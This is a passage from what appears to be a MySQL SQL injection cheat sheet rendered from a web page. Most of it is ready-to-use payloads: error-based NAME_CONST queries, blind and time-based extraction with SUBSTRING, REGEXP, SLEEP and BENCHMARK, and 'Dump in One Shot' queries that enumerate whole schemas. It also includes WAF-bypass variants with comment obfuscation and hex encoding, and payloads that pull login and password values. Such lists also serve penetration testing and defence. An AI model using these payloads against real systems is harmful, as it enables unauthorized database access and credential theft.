<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> NAME_CONST(version(),<span class="number">1</span>),NAME_CONST(version(),<span class="number">1</span>)) <span class="keyword">as</span> x)<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> NAME_CONST(<span class="keyword">user</span>(),<span class="number">1</span>),NAME_CONST(<span class="keyword">user</span>(),<span class="number">1</span>)) <span class="keyword">as</span> x)<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> NAME_CONST(database(),<span class="number">1</span>),NAME_CONST(database(),<span class="number">1</span>)) <span class="keyword">as</span> x)<span class="comment">--</span></span><br></pre></td></tr></table></figure>
<h2 id="MYSQL-Blind"><a href="#MYSQL-Blind" class="headerlink" title="MYSQL Blind"></a>MYSQL Blind</h2><h3 id="MYSQL-Blind-with-substring-equivalent"><a href="#MYSQL-Blind-with-substring-equivalent" class="headerlink" title="MYSQL Blind with substring equivalent"></a>MYSQL Blind with substring equivalent</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">substring</span>(version(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">5</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">right</span>(<span class="keyword">left</span>(version(),<span class="number">1</span>),<span class="number">1</span>)<span class="operator">=</span><span class="number">5</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">left</span>(version(),<span class="number">1</span>)<span class="operator">=</span><span class="number">4</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(<span class="built_in">lower</span>(substr(Version(),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">51</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> mid(version(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">4</span>)</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">SELECT</span> SUBSTR(table_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">FROM</span> information_schema.tables <span class="operator">&gt;</span> <span class="string">&#x27;A&#x27;</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">SELECT</span> SUBSTR(column_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">FROM</span> information_schema.columns <span class="operator">&gt;</span> <span class="string">&#x27;A&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL-Blind-SQL-Injection-in-ORDER-BY-clause-using-a-binary-query-and-REGEXP"><a href="#MySQL-Blind-SQL-Injection-in-ORDER-BY-clause-using-a-binary-query-and-REGEXP" class="headerlink" title="MySQL Blind SQL Injection in ORDER BY clause using a binary query and REGEXP"></a>MySQL Blind SQL Injection in ORDER BY clause using a binary query and REGEXP</h3><p>This query basically orders by one column or the other, depending on whether the EXISTS() returns a 1 or not. For the EXISTS() function to return a 1, the REGEXP query needs to match up, this means you can bruteforce blind values character by character and leak data from the database without direct output.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[...] <span class="keyword">ORDER</span> <span class="keyword">BY</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="keyword">EXISTS</span>(<span class="keyword">SELECT</span> [<span class="keyword">COLUMN</span>] <span class="keyword">FROM</span> [<span class="keyword">TABLE</span>] <span class="keyword">WHERE</span> [<span class="keyword">COLUMN</span>] REGEXP &quot;^[BRUTEFORCE CHAR BY CHAR].*&quot; <span class="keyword">AND</span> [FURTHER OPTIONS <span class="operator">/</span> CONDITIONS]) <span class="keyword">THEN</span> [<span class="keyword">ONE</span> <span class="keyword">COLUMN</span> <span class="keyword">TO</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span>] <span class="keyword">ELSE</span> [ANOTHER <span class="keyword">COLUMN</span> <span class="keyword">TO</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span>] <span class="keyword">END</span>)); <span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<h3 id="MySQL-Blind-SQL-Injection-binary-query-using-REGEXP"><a href="#MySQL-Blind-SQL-Injection-binary-query-using-REGEXP" class="headerlink" title="MySQL Blind SQL Injection binary query using REGEXP."></a>MySQL Blind SQL Injection binary query using REGEXP.</h3><p><strong>Payload:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP &quot;^a.*&quot;) THEN SLEEP(3) ELSE 1 END)); -- -</span></span><br></pre></td></tr></table></figure>
<p>Would work in the query (where the “where” clause is the injection point):</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name,price <span class="keyword">FROM</span> items <span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">OR</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="keyword">EXISTS</span>(<span class="keyword">SELECT</span> name <span class="keyword">FROM</span> items <span class="keyword">WHERE</span> name REGEXP &quot;^a.*&quot;) <span class="keyword">THEN</span> SLEEP(<span class="number">3</span>) <span class="keyword">ELSE</span> <span class="number">1</span> <span class="keyword">END</span>)); <span class="comment">-- -&#x27;;</span></span><br></pre></td></tr></table></figure>
<p>In said query, it will check to see if an item exists in the “name” column in the “items” database that starts with an “a”. If it will sleep for 3 seconds per item.</p>
<h3 id="MYSQL-Blind-using-a-conditional-statement"><a href="#MYSQL-Blind-using-a-conditional-statement" class="headerlink" title="MYSQL Blind using a conditional statement"></a>MYSQL Blind using a conditional statement</h3><p>TRUE: if @@version starts with a 5:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2100935</span><span class="string">&#x27; OR IF(MID(@@version,1,1)=&#x27;</span><span class="number">5</span><span class="string">&#x27;,sleep(1),1)=&#x27;</span><span class="number">2</span></span><br><span class="line">Response:</span><br><span class="line">HTTP<span class="operator">/</span><span class="number">1.1</span> <span class="number">500</span> Internal Server Error</span><br></pre></td></tr></table></figure>
<p>False: if @@version starts with a 4:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2100935</span><span class="string">&#x27; OR IF(MID(@@version,1,1)=&#x27;</span><span class="number">4</span><span class="string">&#x27;,sleep(1),1)=&#x27;</span><span class="number">2</span></span><br><span class="line">Response:</span><br><span class="line">HTTP<span class="operator">/</span><span class="number">1.1</span> <span class="number">200</span> OK</span><br></pre></td></tr></table></figure>
<h3 id="MYSQL-Blind-with-MAKE-SET"><a href="#MYSQL-Blind-with-MAKE-SET" class="headerlink" title="MYSQL Blind with MAKE_SET"></a>MYSQL Blind with MAKE_SET</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> MAKE_SET(YOLO<span class="operator">&lt;</span>(<span class="keyword">SELECT</span>(length(version()))),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">AND</span> MAKE_SET(YOLO<span class="operator">&lt;</span>ascii(<span class="built_in">substring</span>(version(),POS,<span class="number">1</span>)),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">AND</span> MAKE_SET(YOLO<span class="operator">&lt;</span>(<span class="keyword">SELECT</span>(length(concat(login,password)))),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">AND</span> MAKE_SET(YOLO<span class="operator">&lt;</span>ascii(<span class="built_in">substring</span>(concat(login,password),POS,<span class="number">1</span>)),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h3 id="MYSQL-Blind-with-LIKE"><a href="#MYSQL-Blind-with-LIKE" class="headerlink" title="MYSQL Blind with LIKE"></a>MYSQL Blind with LIKE</h3><p>‘_’ acts like the regex character ‘.’, use it to speed up your blind testing</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> cust_code <span class="keyword">FROM</span> customer <span class="keyword">WHERE</span> cust_name <span class="keyword">LIKE</span> <span class="string">&#x27;k__l&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="MYSQL-Time-Based"><a href="#MYSQL-Time-Based" class="headerlink" title="MYSQL Time Based"></a>MYSQL Time Based</h2><p>The following SQL codes will delay the output from MySQL.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">+</span>BENCHMARK(<span class="number">40000000</span>,SHA1(<span class="number">1337</span>))<span class="operator">+</span></span><br><span class="line"><span class="string">&#x27;%2Bbenchmark(3200,SHA1(1))%2B&#x27;</span></span><br><span class="line"><span class="keyword">AND</span> [RANDNUM]<span class="operator">=</span>BENCHMARK([SLEEPTIME]<span class="number">000000</span>,MD5(<span class="string">&#x27;[RANDSTR]&#x27;</span>))  <span class="operator">/</span><span class="operator">/</span>SHA1</span><br><span class="line">RLIKE SLEEP([SLEEPTIME])</span><br><span class="line"><span class="keyword">OR</span> ELT([RANDNUM]<span class="operator">=</span>[RANDNUM],SLEEP([SLEEPTIME]))</span><br></pre></td></tr></table></figure>
<h3 id="Using-SLEEP-in-a-subselect"><a href="#Using-SLEEP-in-a-subselect" class="headerlink" title="Using SLEEP in a subselect"></a>Using SLEEP in a subselect</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;%&#x27;</span>)#</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;___&#x27;</span>)# </span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;____&#x27;</span>)#</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;_____&#x27;</span>)#</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;a____&#x27;</span>)#</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;s____&#x27;</span>)#</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;sa___&#x27;</span>)#</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;sw___&#x27;</span>)#</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;swa__&#x27;</span>)#</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;swb__&#x27;</span>)#</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;swi__&#x27;</span>)#</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> column_name <span class="keyword">like</span> <span class="string">&#x27;%pass%&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>) <span class="keyword">like</span> <span class="string">&#x27;%&#x27;</span>)#</span><br></pre></td></tr></table></figure>

<h3 id="Using-conditional-statements"><a href="#Using-conditional-statements" class="headerlink" title="Using conditional statements"></a>Using conditional statements</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> IF(ASCII(<span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> <span class="keyword">USER</span>()),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">&gt;=</span><span class="number">100</span>,<span class="number">1</span>, BENCHMARK(<span class="number">2000000</span>,MD5(NOW()))) <span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> IF(ASCII(<span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> <span class="keyword">USER</span>()), <span class="number">1</span>, <span class="number">1</span>)))<span class="operator">&gt;=</span><span class="number">100</span>, <span class="number">1</span>, SLEEP(<span class="number">3</span>)) <span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">OR</span> IF(MID(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;5&#x27;</span>,sleep(<span class="number">1</span>),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;2</span></span><br></pre></td></tr></table></figure>
<h2 id="MYSQL-DIOS-Dump-in-One-Shot"><a href="#MYSQL-DIOS-Dump-in-One-Shot" class="headerlink" title="MYSQL DIOS - Dump in One Shot"></a>MYSQL DIOS - Dump in One Shot</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> (@) <span class="keyword">from</span> (<span class="keyword">select</span>(@:<span class="operator">=</span><span class="number">0x00</span>),(<span class="keyword">select</span> (@) <span class="keyword">from</span> (information_schema.columns) <span class="keyword">where</span> (table_schema<span class="operator">&gt;=</span>@) <span class="keyword">and</span> (@)<span class="keyword">in</span> (@:<span class="operator">=</span>concat(@,<span class="number">0x0D</span>,<span class="number">0x0A</span>,<span class="string">&#x27; [ &#x27;</span>,table_schema,<span class="string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="string">&#x27; &gt; &#x27;</span>,column_name,<span class="number">0x7C</span>))))a)#</span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> (@) <span class="keyword">from</span> (<span class="keyword">select</span>(@:<span class="operator">=</span><span class="number">0x00</span>),(<span class="keyword">select</span> (@) <span class="keyword">from</span> (db_data.table_data) <span class="keyword">where</span> (@)<span class="keyword">in</span> (@:<span class="operator">=</span>concat(@,<span class="number">0x0D</span>,<span class="number">0x0A</span>,<span class="number">0x7C</span>,<span class="string">&#x27; [ &#x27;</span>,column_data1,<span class="string">&#x27; ] &gt; &#x27;</span>,column_data2,<span class="string">&#x27; &gt; &#x27;</span>,<span class="number">0x7C</span>))))a)#</span><br><span class="line"></span><br><span class="line"><span class="comment">-- SecurityIdiots</span></span><br><span class="line">make_set(<span class="number">6</span>,@:<span class="operator">=</span><span class="number">0x0a</span>,(<span class="keyword">select</span>(<span class="number">1</span>)<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>@:<span class="operator">=</span>make_set(<span class="number">511</span>,@,<span class="number">0x3c6c693e</span>,table_name,column_name)),@)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Profexer</span></span><br><span class="line">(<span class="keyword">select</span>(@)<span class="keyword">from</span>(<span class="keyword">select</span>(@:<span class="operator">=</span><span class="number">0x00</span>),(<span class="keyword">select</span>(@)<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(@)<span class="keyword">in</span>(@:<span class="operator">=</span>concat(@,<span class="number">0x3C62723E</span>,table_name,<span class="number">0x3a</span>,column_name))))a)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Dr.Z3r0</span></span><br><span class="line">(<span class="keyword">select</span>(<span class="keyword">select</span> concat(@:<span class="operator">=</span><span class="number">0xa7</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>)<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(@:<span class="operator">=</span>concat(@,<span class="number">0x3c6c693e</span>,table_name,<span class="number">0x3a</span>,column_name))),@))</span><br><span class="line"></span><br><span class="line"><span class="comment">-- M@dBl00d</span></span><br><span class="line">(<span class="keyword">Select</span> export_set(<span class="number">5</span>,@:<span class="operator">=</span><span class="number">0</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>)<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>@:<span class="operator">=</span>export_set(<span class="number">5</span>,export_set(<span class="number">5</span>,@,table_name,<span class="number">0x3c6c693e</span>,<span class="number">2</span>),column_name,<span class="number">0xa3a</span>,<span class="number">2</span>)),@,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Zen</span></span><br><span class="line"><span class="operator">+</span>make_set(<span class="number">6</span>,@:<span class="operator">=</span><span class="number">0x0a</span>,(<span class="keyword">select</span>(<span class="number">1</span>)<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>@:<span class="operator">=</span>make_set(<span class="number">511</span>,@,<span class="number">0x3c6c693e</span>,table_name,column_name)),@)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Zen WAF</span></span><br><span class="line">(<span class="comment">/*!12345sELecT*/</span>(@)<span class="keyword">from</span>(<span class="comment">/*!12345sELecT*/</span>(@:<span class="operator">=</span><span class="number">0x00</span>),(<span class="comment">/*!12345sELecT*/</span>(@)<span class="keyword">from</span>(`InFoRMAtiON_sCHeMa`.`ColUMNs`)<span class="keyword">where</span>(`TAblE_sCHemA`<span class="operator">=</span>DatAbAsE<span class="comment">/*data*/</span>())<span class="keyword">and</span>(@)<span class="keyword">in</span>(@:<span class="operator">=</span>CoNCat<span class="operator">%</span><span class="number">0</span>a(@,<span class="number">0x3c62723e5461626c6520466f756e64203a20</span>,TaBLe_nAMe,<span class="number">0x3a3a</span>,column_name))))a)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ~tr0jAn WAF</span></span><br><span class="line"><span class="operator">+</span>concat<span class="comment">/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/</span>(<span class="variable">@x</span>)<span class="comment">/*!from*/</span>(<span class="comment">/*!12345selEcT*/</span>(<span class="variable">@x</span>:<span class="operator">=</span><span class="number">0x00</span>),(<span class="variable">@r</span>:<span class="operator">=</span><span class="number">0</span>),(<span class="variable">@running</span>_number:<span class="operator">=</span><span class="number">0</span>),(<span class="variable">@tbl</span>:<span class="operator">=</span><span class="number">0x00</span>),(<span class="comment">/*!12345selEcT*/</span>(<span class="number">0</span>) <span class="keyword">from</span>(information_schema.<span class="comment">/**/</span>columns)<span class="keyword">where</span>(table_schema<span class="operator">=</span>database()) <span class="keyword">and</span>(<span class="number">0x00</span>)<span class="keyword">in</span>(<span class="variable">@x</span>:<span class="operator">=</span>Concat<span class="comment">/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/</span><span class="operator">+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- ~tr0jAn Benchmark</span></span><br><span class="line"><span class="operator">+</span>concat(<span class="number">0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20</span>,version(),<span class="number">0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.schemata),<span class="number">0x3c2f666f6e743e3c2f666f6e743e</span>,<span class="number">0x202d2d203a2d20</span>,concat(<span class="variable">@sc</span>:<span class="operator">=</span><span class="number">0x00</span>,<span class="variable">@scc</span>:<span class="operator">=</span><span class="number">0x00</span>,<span class="variable">@r</span>:<span class="operator">=</span><span class="number">0</span>,benchmark(<span class="variable">@a</span>:<span class="operator">=</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.schemata),<span class="variable">@scc</span>:<span class="operator">=</span>concat(<span class="variable">@scc</span>,<span class="number">0x3c62723e3c62723e</span>,<span class="number">0x3c666f6e7420636f6c6f723d7265643e</span>,LPAD(<span class="variable">@r</span>:<span class="operator">=</span><span class="variable">@r</span><span class="operator">%</span><span class="number">2</span>b1,<span class="number">3</span>,<span class="number">0x30</span>),<span class="number">0x2e20</span>,(<span class="keyword">Select</span> concat(<span class="number">0x3c623e</span>,<span class="variable">@sc</span>:<span class="operator">=</span>schema_name,<span class="number">0x3c2f623e</span>) <span class="keyword">from</span> information_schema.schemata <span class="keyword">where</span> schema_name<span class="operator">&gt;</span><span class="variable">@sc</span> <span class="keyword">order</span> <span class="keyword">by</span> schema_name limit <span class="number">1</span>),<span class="number">0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_Schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="variable">@sc</span>),<span class="number">0x29</span>,<span class="number">0x3c2f666f6e743e</span>,<span class="number">0x202e2e2e20</span> ,<span class="variable">@t</span>:<span class="operator">=</span><span class="number">0x00</span>,<span class="variable">@tt</span>:<span class="operator">=</span><span class="number">0x00</span>,<span class="variable">@tr</span>:<span class="operator">=</span><span class="number">0</span>,benchmark((<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_Schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="variable">@sc</span>),<span class="variable">@tt</span>:<span class="operator">=</span>concat(<span class="variable">@tt</span>,<span class="number">0x3c62723e</span>,<span class="number">0x3c666f6e7420636f6c6f723d677265656e3e</span>,LPAD(<span class="variable">@tr</span>:<span class="operator">=</span><span class="variable">@tr</span><span class="operator">%</span><span class="number">2</span>b1,<span class="number">3</span>,<span class="number">0x30</span>),<span class="number">0x2e20</span>,(<span class="keyword">select</span> concat(<span class="number">0x3c623e</span>,<span class="variable">@t</span>:<span class="operator">=</span>table_name,<span class="number">0x3c2f623e</span>) <span class="keyword">from</span> information_Schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="variable">@sc</span> <span class="keyword">and</span> table_name<span class="operator">&gt;</span><span class="variable">@t</span> <span class="keyword">order</span> <span class="keyword">by</span> table_name limit <span class="number">1</span>),<span class="number">0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_Schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="variable">@t</span>),<span class="number">0x29</span>,<span class="number">0x3c2f666f6e743e</span>,<span class="number">0x202d2d3a20</span>,<span class="variable">@c</span>:<span class="operator">=</span><span class="number">0x00</span>,<span class="variable">@cc</span>:<span class="operator">=</span><span class="number">0x00</span>,<span class="variable">@cr</span>:<span class="operator">=</span><span class="number">0</span>,benchmark((<span class="keyword">Select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="variable">@sc</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="variable">@t</span>),<span class="variable">@cc</span>:<span class="operator">=</span>concat(<span class="variable">@cc</span>,<span class="number">0x3c62723e</span>,<span class="number">0x3c666f6e7420636f6c6f723d707572706c653e</span>,LPAD(<span class="variable">@cr</span>:<span class="operator">=</span><span class="variable">@cr</span><span class="operator">%</span><span class="number">2</span>b1,<span class="number">3</span>,<span class="number">0x30</span>),<span class="number">0x2e20</span>,(<span class="keyword">Select</span> (<span class="variable">@c</span>:<span class="operator">=</span>column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="variable">@sc</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="variable">@t</span> <span class="keyword">and</span> column_name<span class="operator">&gt;</span><span class="variable">@c</span> <span class="keyword">order</span> <span class="keyword">by</span> column_name LIMIT <span class="number">1</span>),<span class="number">0x3c2f666f6e743e</span>)),<span class="variable">@cc</span>,<span class="number">0x3c62723e</span>)),<span class="variable">@tt</span>)),<span class="variable">@scc</span>),<span class="number">0x3c62723e3c62723e</span>,<span class="number">0x3c62723e3c62723e</span>)<span class="operator">+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- N1Z4M WAF</span></span><br><span class="line"><span class="operator">+</span><span class="comment">/*!13337concat*/</span>(<span class="number">0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e</span>,database<span class="comment">/**N1Z4M**/</span>(),<span 